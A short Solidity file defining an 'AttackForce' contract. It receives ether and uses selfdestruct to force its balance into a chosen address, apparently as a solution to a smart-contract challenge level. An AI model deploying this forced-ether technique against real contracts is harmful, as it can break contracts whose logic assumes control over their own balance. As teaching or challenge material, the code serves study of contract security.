//SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract AttackForce {
    receive() external payable {}

    function destroy(address payable _address) public {
        selfdestruct(_address);
    }
}
